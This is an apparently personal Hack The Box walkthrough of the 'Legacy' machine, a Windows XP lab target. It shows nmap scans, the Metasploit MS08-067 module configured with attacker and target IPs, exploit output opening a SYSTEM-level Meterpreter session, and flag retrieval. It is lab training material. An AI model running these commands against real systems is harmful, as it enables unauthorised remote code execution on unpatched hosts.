# Legacy

Legacy is a Windows-based Hack The Box machine focused on SMB enumeration and exploitation of a vulnerable Windows XP system.

**Target IP:** `10.129.227.181`

---

## Overview

The initial Nmap scan revealed three open ports:

* `135/tcp` — MSRPC
* `139/tcp` — NetBIOS Session Service
* `445/tcp` — SMB

Service and version detection identified the target as **Windows XP**.

Further SMB enumeration showed that the machine was vulnerable to **MS08-067**, a remote code execution vulnerability affecting the Windows Server service.

Exploitation through Metasploit provided a Meterpreter session running as **NT AUTHORITY\SYSTEM**, allowing access to both the user and root flags.

---

# Enumeration

## Nmap Scan

We begin with a standard Nmap scan:

```bash
nmap 10.129.227.181
```

Output:

```text
Nmap scan report for 10.129.227.181
Host is up, received echo-reply ttl 127 (0.25s latency).

PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127
```

The main services identified were:

| Port | Service      | Description             |
| ---- | ------------ | ----------------------- |
| 135  | MSRPC        | Microsoft RPC           |
| 139  | NetBIOS-SSN  | NetBIOS Session Service |
| 445  | Microsoft-DS | SMB                     |

An all-port scan was also running in the background.

---

## Service and Version Detection

Next, service and version detection was performed:

```bash
nmap -sC -sV 10.129.227.181
```

The results confirmed:

```text
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
```

Nmap identified the operating system as:

```text
Windows XP
```

The SMB-related scripts also provided additional information:

```text
NetBIOS name: LEGACY
Workgroup: HTB
Computer name: legacy
OS: Windows XP (Windows 2000 LAN Manager)
```

SMB signing was also reported as disabled:

```text
message_signing: disabled
```

At this point, SMB became the primary service to investigate.

---

# SMB Enumeration

Since ports `139` and `445` were open and the target was identified as Windows XP, SMB enumeration was performed.

The SMB service revealed that the system was running an old Windows XP installation.

The target was found to be vulnerable to **MS08-067**, a remote code execution vulnerability in the Windows Server service.

The corresponding Metasploit module was:

```text
exploit/windows/smb/ms08_067_netapi
```

---

# Initial Foothold

## MS08-067 — SMB Remote Code Execution

We launched Metasploit and selected the MS08-067 exploit:

```text
use exploit/windows/smb/ms08_067_netapi
```

The attacker machine IP was configured as the `LHOST`:

```text
set LHOST 10.10.15.95
```

The target IP was configured as the `RHOSTS`:

```text
set RHOSTS 10.129.227.181
```

The final configuration was:

```text
exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.15.95
LHOST => 10.10.15.95

exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.129.227.181
RHOSTS => 10.129.227.181
```

We then executed the exploit:

```text
exploit
```

Metasploit automatically detected the target:

```text
[*] 10.129.227.181:445 - Automatically detecting the target...
[*] 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.227.181:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.227.181:445 - Attempting to trigger the vulnerability...
```

The exploit successfully triggered the vulnerability and opened a Meterpreter session:

```text
[*] Sending stage (190534 bytes) to 10.129.227.181
[*] Meterpreter session 1 opened
```

We now had a shell on the target.

---

# User Access

After obtaining the Meterpreter session, we checked the current user:

```text
getuid
```

The result was:

```text
Server username: NT AUTHORITY\SYSTEM
```

This is significant because the Meterpreter session already had **SYSTEM-level privileges**.

Therefore, no separate privilege escalation was required.

We navigated to the user's Desktop:

```text
cd C:\Documents and Settings\john\Desktop
```

Listing the directory showed the user flag:

```text
Mode              Size  Type  Name
----              ----  ----  ----
100444/r--r--r--  32    fil   user.txt
```

The flag was then read:

```text
cat user.txt
```

---

# Privilege Escalation

No privilege escalation was necessary.

The initial exploit directly provided:

```text
NT AUTHORITY\SYSTEM
```

Since SYSTEM is the highest local privilege level on the Windows system, we could access both the user and Administrator desktops.

---

# Root Access

We navigated to the Administrator's Desktop:

```text
cd Administrator\
cd Desktop\
```

The resulting path was:

```text
C:\Documents and Settings\Administrator\Desktop
```

The root flag was then retrieved:

```text
cat root.txt
```

With SYSTEM privileges, the Administrator's Desktop was accessible without any additional exploitation.

---

# Attack Path Summary

The complete attack path was:

```text
Nmap Enumeration
        |
        v
SMB Ports 139/445
        |
        v
Windows XP Identified
        |
        v
MS08-067 Vulnerability
        |
        v
Metasploit Exploitation
        |
        v
Meterpreter Session
        |
        v
NT AUTHORITY\SYSTEM
        |
        +------------------+
        |                  |
        v                  v
   john Desktop       Administrator
        |                  |
        v                  v
    user.txt            root.txt
```

---

# Key Takeaways

* SMB exposed on ports `139` and `445` was the primary attack surface.
* Service and OS enumeration identified the target as **Windows XP**.
* The legacy Windows XP system was vulnerable to **MS08-067**.
* The Metasploit `ms08_067_netapi` module provided remote code execution.
* The resulting Meterpreter session already ran as **NT AUTHORITY\SYSTEM**.
* Because SYSTEM access was obtained immediately, no separate privilege escalation was required.
* Both flags were accessible directly after exploitation.

---

# Tools Used

| Tool                 | Purpose                              |
| -------------------- | ------------------------------------ |
| Nmap                 | Port, service, and OS enumeration    |
| Metasploit Framework | MS08-067 exploitation                |
| Meterpreter          | Post-exploitation and flag retrieval |

---

# Conclusion

Legacy demonstrates how dangerous outdated Windows systems can be when exposed services contain well-known vulnerabilities.

The machine was compromised by identifying the Windows XP SMB service, recognizing its exposure to **MS08-067**, and exploiting it through Metasploit.

The exploit provided a Meterpreter session with **NT AUTHORITY\SYSTEM** privileges, allowing direct access to both the user and Administrator flags.

**Attack Path:** SMB Enumeration → MS08-067 → Remote Code Execution → SYSTEM → User & Root Flags
